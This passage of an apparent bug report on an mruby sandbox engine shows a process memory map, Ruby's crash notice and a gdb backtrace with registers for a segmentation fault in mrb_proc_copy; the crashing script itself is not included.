7fdcc4811000-7fdcc4814000 rw-p 00000000 00:00 0 
7fdcc4814000-7fdcc487b000 r-xp 00000000 08:03 935796                     /usr/lib/libssl.so.1.0.0
7fdcc487b000-7fdcc4a7a000 ---p 00067000 08:03 935796                     /usr/lib/libssl.so.1.0.0
7fdcc4a7a000-7fdcc4a7e000 r--p 00066000 08:03 935796                     /usr/lib/libssl.so.1.0.0
7fdcc4a7e000-7fdcc4a85000 rw-p 0006a000 08:03 935796                     /usr/lib/libssl.so.1.0.0
7fdcc4a85000-7fdcc4ad4000 r-xp 00000000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so
7fdcc4ad4000-7fdcc4cd4000 ---p 0004f000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so
7fdcc4cd4000-7fdcc4cd6000 r--p 0004f000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so
7fdcc4cd6000-7fdcc4cd8000 rw-p 00051000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so
7fdcc4cd8000-7fdcc4cd9000 rw-p 00000000 00:00 0 
7fdcc4cd9000-7fdcc4cda000 r-xp 00000000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so
7fdcc4cda000-7fdcc4eda000 ---p 00001000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so
7fdcc4eda000-7fdcc4edb000 r--p 00001000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so
7fdcc4edb000-7fdcc4edc000 rw-p 00002000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so
7fdcc4edc000-7fdcc4f0b000 r-xp 00000000 08:03 948450                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so
7fdcc4f0b000-7fdcc510b000 ---p 0002f000 08:03 948450                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so
7fdcc510b000-7fdcc510c000 r--p 0002f000 08:03 948450                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so
7fdcc510c000-7fdcc510d000 rw-p 00030000 08:03 948450                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so
7fdcc510d000-7fdcc510e000 rw-p 00000000 00:00 0 
7fdcc510e000-7fdcc5111000 r-xp 00000000 08:03 948498                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so
7fdcc5111000-7fdcc5310000 ---p 00003000 08:03 948498                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so
7fdcc5310000-7fdcc5311000 r--p 00002000 08:03 948498                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so
7fdcc5311000-7fdcc5312000 rw-p 00003000 08:03 948498                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so
7fdcc5312000-7fdcc5327000 r-xp 00000000 08:03 935844                     /usr/lib/libz.so.1.2.8
7fdcc5327000-7fdcc5526000 ---p 00015000 08:03 935844                     /usr/lib/libz.so.1.2.8
7fdcc5526000-7fdcc5527000 r--p 00014000 08:03 935844                     /usr/lib/libz.so.1.2.8
7fdcc5527000-7fdcc5528000 rw-p 00015000 08:03 935844                     /usr/lib/libz.so.1.2.8
7fdcc5528000-7fdcc5535000 r-xp 00000000 08:03 948479                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so
7fdcc5535000-7fdcc5734000 ---p 0000d000 08:03 948479                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so
7fdcc5734000-7fdcc5735000 r--p 0000c000 08:03 948479                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so
7fdcc5735000-7fdcc5736000 rw-p 0000d000 08:03 948479                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so
7fdcc5736000-7fdcc5738000 r-xp 00000000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so
7fdcc5738000-7fdcc5937000 ---p 00002000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so
7fdcc5937000-7fdcc5938000 r--p 00001000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so
7fdcc5938000-7fdcc5939000 rw-p 00002000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so
7fdcc5939000-7fdcc5963000 r-xp 00000000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so
7fdcc5963000-7fdcc5b62000 ---p 0002a000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so
7fdcc5b62000-7fdcc5b63000 r--p 00029000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so
7fdcc5b63000-7fdcc5b64000 rw-p 0002a000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so
7fdcc5b64000-7fdcc5b6a000 r-xp 00000000 08:03 948457                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so
7fdcc5b6a000-7fdcc5d69000 ---p 00006000 08:03 948457                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so
7fdcc5d69000-7fdcc5d6a000 r--p 00005000 08:03 948457                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so
7fdcc5d6a000-7fdcc5d6b000 rw-p 00006000 08:03 948457                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so
7fdcc5d6b000-7fdcc5d6f000 r-xp 00000000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so
7fdcc5d6f000-7fdcc5f6e000 ---p 00004000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so
7fdcc5f6e000-7fdcc5f6f000 r--p 00003000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so
7fdcc5f6f000-7fdcc5f70000 rw-p 00004000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so
7fdcc5f70000-7fdcc5f76000 r-xp 00000000 08:03 948472                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so
7fdcc5f76000-7fdcc6175000 ---p 00006000 08:03 948472                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so
7fdcc6175000-7fdcc6176000 r--p 00005000 08:03 948472                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so
7fdcc6176000-7fdcc6177000 rw-p 00006000 08:03 948472                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so
7fdcc6177000-7fdcc617e000 r-xp 00000000 08:03 948455                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so
7fdcc617e000-7fdcc637d000 ---p 00007000 08:03 948455                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so
7fdcc637d000-7fdcc637e000 r--p 00006000 08:03 948455                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so
7fdcc637e000-7fdcc637f000 rw-p 00007000 08:03 948455                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so
7fdcc637f000-7fdcc6381000 r-xp 00000000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so
7fdcc6381000-7fdcc6581000 ---p 00002000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so
7fdcc6581000-7fdcc6582000 r--p 00002000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so
7fdcc6582000-7fdcc6583000 rw-p 00003000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so
7fdcc6583000-7fdcc6585000 r-xp 00000000 08:03 948512                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so
7fdcc6585000-7fdcc6784000 ---p 00002000 08:03 948512                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so
7fdcc6784000-7fdcc6785000 r--p 00001000 08:03 948512                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so
7fdcc6785000-7fdcc6786000 rw-p 00002000 08:03 948512                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so
7fdcc6786000-7fdcc6887000 rw-p 00000000 00:00 0 
7fdcc6887000-7fdcc698a000 r-xp 00000000 08:03 935421                     /usr/lib/libm-2.24.so
7fdcc698a000-7fdcc6b89000 ---p 00103000 08:03 935421                     /usr/lib/libm-2.24.so
7fdcc6b89000-7fdcc6b8a000 r--p 00102000 08:03 935421                     /usr/lib/libm-2.24.so
7fdcc6b8a000-7fdcc6b8b000 rw-p 00103000 08:03 935421                     /usr/lib/libm-2.24.so
7fdcc6b8b000-7fdcc6b93000 r-xp 00000000 08:03 935412                     /usr/lib/libcrypt-2.24.so
7fdcc6b93000-7fdcc6d93000 ---p 00008000 08:03 935412                     /usr/lib/libcrypt-2.24.so
7fdcc6d93000-7fdcc6d94000 r--p 00008000 08:03 935412                     /usr/lib/libcrypt-2.24.so
7fdcc6d94000-7fdcc6d95000 rw-p 00009000 08:03 935412                     /usr/lib/libcrypt-2.24.so
7fdcc6d95000-7fdcc6dc3000 rw-p 00000000 00:00 0 
7fdcc6dc3000-7fdcc6dc5000 r-xp 00000000 08:03 935420                     /usr/lib/libdl-2.24.so
7fdcc6dc5000-7fdcc6fc5000 ---p 00002000 08:03 935420                     /usr/lib/libdl-2.24.so
7fdcc6fc5000-7fdcc6fc6000 r--p 00002000 08:03 935420                     /usr/lib/libdl-2.24.so
7fdcc6fc6000-7fdcc6fc7000 rw-p 00003000 08:03 935420                     /usr/lib/libdl-2.24.so
7fdcc6fc7000-7fdcc7059000 r-xp 00000000 08:03 935607                     /usr/lib/libgmp.so.10.3.1
7fdcc7059000-7fdcc7258000 ---p 00092000 08:03 935607                     /usr/lib/libgmp.so.10.3.1
7fdcc7258000-7fdcc7259000 r--p 00091000 08:03 935607                     /usr/lib/libgmp.so.10.3.1
7fdcc7259000-7fdcc725a000 rw-p 00092000 08:03 935607                     /usr/lib/libgmp.so.10.3.1
7fdcc725a000-7fdcc7272000 r-xp 00000000 08:03 934933                     /usr/lib/libpthread-2.24.so
7fdcc7272000-7fdcc7471000 ---p 00018000 08:03 934933                     /usr/lib/libpthread-2.24.so
7fdcc7471000-7fdcc7472000 r--p 00017000 08:03 934933                     /usr/lib/libpthread-2.24.so
7fdcc7472000-7fdcc7473000 rw-p 00018000 08:03 934933                     /usr/lib/libpthread-2.24.so
7fdcc7473000-7fdcc7477000 rw-p 00000000 00:00 0 
7fdcc7477000-7fdcc760c000 r-xp 00000000 08:03 934952                     /usr/lib/libc-2.24.so
7fdcc760c000-7fdcc780b000 ---p 00195000 08:03 934952                     /usr/lib/libc-2.24.so
7fdcc780b000-7fdcc780f000 r--p 00194000 08:03 934952                     /usr/lib/libc-2.24.so
7fdcc780f000-7fdcc7811000 rw-p 00198000 08:03 934952                     /usr/lib/libc-2.24.so
7fdcc7811000-7fdcc7815000 rw-p 00000000 00:00 0 
7fdcc7815000-7fdcc7a89000 r-xp 00000000 08:03 936075                     /usr/lib/libruby.so.2.3.0
7fdcc7a89000-7fdcc7c88000 ---p 00274000 08:03 936075                     /usr/lib/libruby.so.2.3.0
7fdcc7c88000-7fdcc7c8e000 r--p 00273000 08:03 936075                     /usr/lib/libruby.so.2.3.0
7fdcc7c8e000-7fdcc7c91000 rw-p 00279000 08:03 936075                     /usr/lib/libruby.so.2.3.0
7fdcc7c91000-7fdcc7ca2000 rw-p 00000000 00:00 0 
7fdcc7ca2000-7fdcc7cc5000 r-xp 00000000 08:03 934951                     /usr/lib/ld-2.24.so
7fdcc7d16000-7fdcc7eae000 r--p 00000000 08:03 934978                     /usr/lib/locale/locale-archive
7fdcc7eae000-7fdcc7eb4000 rw-p 00000000 00:00 0 
7fdcc7ebe000-7fdcc7ec0000 r--s 00000000 08:03 948907                     /usr/bin/ruby
7fdcc7ec0000-7fdcc7ec1000 ---p 00000000 00:00 0 
7fdcc7ec1000-7fdcc7ec4000 rw-p 00000000 00:00 0 
7fdcc7ec4000-7fdcc7ec5000 r--p 00022000 08:03 934951                     /usr/lib/ld-2.24.so
7fdcc7ec5000-7fdcc7ec6000 rw-p 00023000 08:03 934951                     /usr/lib/ld-2.24.so
7fdcc7ec6000-7fdcc7ec7000 rw-p 00000000 00:00 0 
7ffd405b1000-7ffd40db0000 rw-p 00000000 00:00 0                          [stack]
7ffd40dc4000-7ffd40dc6000 r--p 00000000 00:00 0                          [vvar]
7ffd40dc6000-7ffd40dc8000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]


[NOTE]
You may have encountered a bug in the Ruby interpreter or extension libraries.
Bug reports are welcome.
For details: http://www.ruby-lang.org/bugreport.html

[1]    10951 abort (core dumped)  bin/sandbox crashes/proc_crash.mrb
```

gdb:
```
$ gdb attach `pidof ruby`
GNU gdb (GDB) 7.12
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-pc-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
attach: No such file or directory.
Attaching to process 11091
[New LWP 11092]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
0x00007fb39fc594b8 in pthread_cond_timedwait@@GLIBC_2.3.2 () from /usr/lib/libpthread.so.0
(gdb) c
Continuing.
[New Thread 0x7fb39ae43700 (LWP 11151)]

Thread 3 "ruby" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7fb39ae43700 (LWP 11151)]
mrb_proc_copy (a=a@entry=0x7fb39ae4c520, b=0x7fb39ae4c490) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/proc.c:144
144	    a->body.irep->refcnt++;
(gdb) bt
#0  mrb_proc_copy (a=a@entry=0x7fb39ae4c520, b=0x7fb39ae4c490) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/proc.c:144
#1  0x00007fb39c2de7be in mrb_proc_init_copy (mrb=0x7fb39ae444e0, self=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/proc.c:175
#2  0x00007fb39c2cce4f in mrb_vm_exec (mrb=mrb@entry=0x7fb39ae444e0, proc=<optimized out>, proc@entry=0x7fb39ae4c580, pc=<optimized out>)
    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165
#3  0x00007fb39c2d2697 in mrb_vm_run (mrb=0x7fb39ae444e0, proc=0x7fb39ae4c580, self=..., stack_keep=stack_keep@entry=0) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766
#4  0x00007fb39c2b3613 in mruby_engine_monitored_eval (data=0x7fb39ae443e0) at ../../../../ext/mruby_engine/eval_monitored.c:68
#5  0x00007fb39fc53454 in start_thread () from /usr/lib/libpthread.so.0
#6  0x00007fb39ff517df in clone () from /usr/lib/libc.so.6
(gdb) info registers
rax            0x0	0
rbx            0x7fb39ae4c520	140409374557472
rcx            0x0	0
rdx            0x0	0
rsi            0x7fb39ae4c490	140409374557328
rdi            0x7fb39ae4c520	140409374557472
rbp            0x7fb39ae444e0	0x7fb39ae444e0
rsp            0x7fb39ae42aa8	0x7fb39ae42aa8
r8             0x7fb39ae52560	140409374582112
r9             0x1	1
r10            0x0	0
r11            0x0	0
r12            0x7fb39ae4c520	140409374557472
r13            0x4d	77
r14            0x7fb39ae444e0	140409374524640
r15            0x7fb39ae4eb60	140409374567264
rip            0x7fb39c2de605	0x7fb39c2de605 <mrb_proc_copy+37>
eflags         0x10246	[ PF ZF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) 
```

## Attachments
No attachments
